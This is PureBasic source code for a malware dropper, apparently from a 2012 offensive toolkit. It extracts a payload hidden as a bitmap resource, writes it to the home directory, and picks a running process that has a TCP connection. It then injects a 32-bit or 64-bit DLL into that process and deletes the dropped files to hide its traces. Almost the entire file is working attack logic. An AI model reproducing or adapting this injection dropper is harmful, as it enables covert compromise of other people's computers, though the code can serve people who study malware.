; ***************************************************************************
; *                                                                         *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; * License:     BSD License                                                *
; * Copyright:   (c) 2012, a12d404.net                                      *
; * Status:      Prototype                                                  *
; *                                                                         *
; ***************************************************************************
EnableExplicit


XIncludeFile("filesystem/pefile.pbi")
XIncludeFile("security/rc4_crypto.pbi")
XIncludeFile("network/tcpip.pbi")
XIncludeFile("include/inc_dropper.pbi")

; ---------------------------------------------------------------------------
;- Consts


; ---------------------------------------------------------------------------
;- Types


; ---------------------------------------------------------------------------
;- Prototypes


; ---------------------------------------------------------------------------
;- Variables
Global checksum.s
Global homeDir.s
Global packedPayloadFilename.s

Global *payload
Global payloadSize.i = 0
Define targetProcessPid.l = 0

; ---------------------------------------------------------------------------
;- Procedures

; ***************************************************************************
; * Sample -- Does nothing ... really!                                      *
; ***************************************************************************
;Procedure.b Sample(param.l)
;   Define res.b
;   
; SampleCleanup:
;   
;   ProcedureReturn res
; SampleError:
;   res = #False
;   Goto SampleCleanup
;EndProcedure

; ---------------------------------------------------------------------------

; ***************************************************************************
; * GoInject --                                                             *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; ***************************************************************************
Procedure GoInject(pidForInjection.l)
  Define res.b = #False
  Define is32.b = #False
  
  Define localFileName.s = homeDir + checksum + ".dll"
  
  If pidForInjection = 0
    Goto GoInjectCleanup
  EndIf
  
  If InjectDll(localFileName, pidForInjection)
    WaitForProcess(pidForInjection)
  EndIf
  
GoInjectCleanup:
  DeleteFile(localFileName)
EndProcedure

; ***************************************************************************
; * Main *
; ********

checksum = ResourceLoadString(#RES_STR_LOCAL_FILE_NAME)
homeDir = GetHomeDirectory()
packedPayloadFilename = homeDir + checksum + ".bin"

CompilerSelect #PB_Compiler_Processor
  CompilerCase #PB_Processor_x86
    ; ***************************************************************************
    ; * GoInject --                                                             *
    ; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
    ; ***************************************************************************
    Procedure Go64bit()
      Define res.b = #False
      Define is32.b = #False
      
      Define localFileName.s = homeDir + checksum
      
      ; extract 64bit exe+dll
      If Not OpenPack(packedPayloadFilename)
        End 1
      EndIf
      ; skip 32bit stuff
      NextPackFile()
      
      ; EXE
      *payload = NextPackFile()
      payloadSize = PackFileSize()
      StreamToFile(localFileName + ".exe", *payload, payloadSize)
      
      ; DLL
      *payload = NextPackFile()
      payloadSize = PackFileSize()
      StreamToFile(localFileName + ".dll", *payload, payloadSize)
      ClosePack()
      
      RunProgram(localFileName, "", homeDir, #PB_Program_Wait)
      
    Go64bitCleanup:
      DeleteFile(localFileName + ".exe")
      DeleteFile(localFileName + ".dll")
    EndProcedure
    
    ; get size of packed payload
    payloadSize = ResourceSize(#RES_PAYLOAD, #RT_BITMAP)
    *payload = AllocateMemory(payloadSize)
    If Not *payload
      End 1
    EndIf
    
    ; allocate memory for packed payload
    If Not ResourceLoadData(*payload, payloadSize, #RES_PAYLOAD, #RT_BITMAP)
      End 1
    EndIf
    
    If Not StreamToFile(packedPayloadFilename, *payload, payloadSize)
      End 1
    EndIf
    FreeMemory(*payload)
    payloadSize = 0
    
    targetProcessPid = Get32BitSuitablePidForTcpConnection()
    If targetProcessPid = 0
      ; Search for active 64bit process
      targetProcessPid = Get64BitSuitablePidForTcpConnection()
      If targetProcessPid > 0
        ; 64bit process found
        
        Go64bit()
      EndIf
    Else
      ; 32bit process found
      
      ; extract 32bit dll
      If Not OpenPack(packedPayloadFilename)
        End 1
      EndIf
      *payload = NextPackFile()
      payloadSize = PackFileSize()
      StreamToFile(homeDir + checksum + ".dll", *payload, payloadSize)
      ClosePack()
      
      GoInject(targetProcessPid)
    EndIf
    
    If FileSize(packedPayloadFilename) > 0
      DeleteFile(packedPayloadFilename)
    EndIf
  CompilerCase #PB_Processor_x64
    targetProcessPid = Get64BitSuitablePidForTcpConnection()
    If targetProcessPid > 0
      ; 64bit process found
      GoInject(targetProcessPid)
    EndIf
  CompilerDefault
    CompilerError "Target processor not supported!"
CompilerEndSelect

; IDE Options = PureBasic 4.60 Beta 3 (Windows - x64)
; CursorPosition = 127
; FirstLine = 93
; Folding = -
; EnableXP
; EnablePurifier
; EnableCompileCount = 0
; EnableBuildCount = 0
; EnableExeConstant